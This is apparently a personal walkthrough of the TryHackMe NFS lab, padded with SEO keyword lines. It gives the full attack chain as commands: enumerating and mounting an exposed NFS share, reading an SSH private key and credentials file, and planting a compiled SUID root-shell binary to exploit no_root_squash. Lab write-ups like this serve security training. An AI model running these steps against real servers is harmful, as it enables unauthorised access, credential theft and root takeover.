# TryHackMe – Network Services (NFS Lab) – My Write-Up
This is my personal walkthrough of how I solved the NFS challenge in the TryHackMe Network Services learning path.  
(SEO Keywords: TryHackMe NFS Writeup, Network Services TryHackMe, NFS Penetration Testing, NFS Misconfiguration Exploit, Cybersecurity Labs, Ethical Hacking Walkthrough)

---

## Step 1: Scanning the Target for NFS
I started with an Nmap scan to identify NFS and its related services. This is a common step in penetration testing and CTF challenges.

nmap -sV -p 111,2049 <TARGET-IP>

Results showed:
- 111/tcp open  rpcbind
- 2049/tcp open nfs

(SEO Keywords: Nmap scan NFS, rpcbind enumeration, NFS enumeration techniques)

---

## Step 2: Enumerating NFS Exported Shares
Next, I checked the exported NFS directories, which is an important technique in real-world network penetration testing.

showmount -e <TARGET-IP>

I found exported directories such as:

/home  
/var/nfs  

(SEO Keywords: showmount -e usage, NFS exported shares, Linux NFS hacking)

---

## Step 3: Mounting the Share
I created a local mount directory:

sudo mkdir /mnt/nfs

Then mounted the NFS share:

sudo mount -t nfs <TARGET-IP>:/home /mnt/nfs

After mounting, I explored:

cd /mnt/nfs  
ls  

(SEO Keywords: mount NFS in Linux, NFS exploitation tutorial)

---

## Step 4: Extracting Sensitive Files
Inside the NFS mount, I found important files such as:

- user.txt  
- creds.txt  
- .ssh folder containing private keys  

I extracted the user flag:

cat user.txt  

Then I viewed the SSH private key:

cat id_rsa  

(SEO Keywords: SSH key extraction, NFS insecure configuration, TryHackMe Network Services NFS solution)

---

## Step 5: Logging In Using SSH Key
I fixed permissions:

chmod 600 id_rsa

Then logged in:

ssh -i id_rsa <username>@<TARGET-IP>

(SEO Keywords: SSH login using private key, id_rsa penetration testing)

---

## Step 6: Root Privilege Escalation via NFS Misconfiguration
The NFS share had **no_root_squash**, a known vulnerability that allows privilege escalation.

I created a SUID exploit:

echo 'int main(){setuid(0); system("/bin/sh");}' > suid.c  
gcc suid.c -o exploit  
chmod +s exploit  

Then copied it into the NFS share:

cp exploit /mnt/nfs/

After SSH’ing into the machine, I executed it:

./exploit  

This gave me **root shell**.

(SEO Keywords: no_root_squash exploit, NFS privilege escalation, SUID binary exploit, Ethical hacking techniques)

---

## Step 7: Getting the Final Root Flag
I navigated to the root folder:

cd /root  
ls  

Then captured the final flag:

cat root.txt  

(SEO Keywords: TryHackMe root flag, CTF root access, Linux privilege escalation)

---

# Summary (How I Solved It)
1. Nmap scanning for NFS  
2. Enumerated NFS shared directories  
3. Mounted NFS share on Linux  
4. Extracted SSH credentials  
5. Logged into machine using SSH key  
6. Exploited NFS no_root_squash  
7. Used SUID binary for privilege escalation  
8. Retrieved root flag  

(SEO Keywords: TryHackMe write-ups, Ethical hacking tutorials, Cybersecurity practical labs, Linux NFS exploitation)

---

## Author
Shivam Singh  
Penetration Tester & Bug Hunter  
GitHub: https://github.com/vgod-sec
(SEO Keywords: Shivam Singh Cyber Security, Penetration Tester Portfolio, Bug Bounty Hunter GitHub)
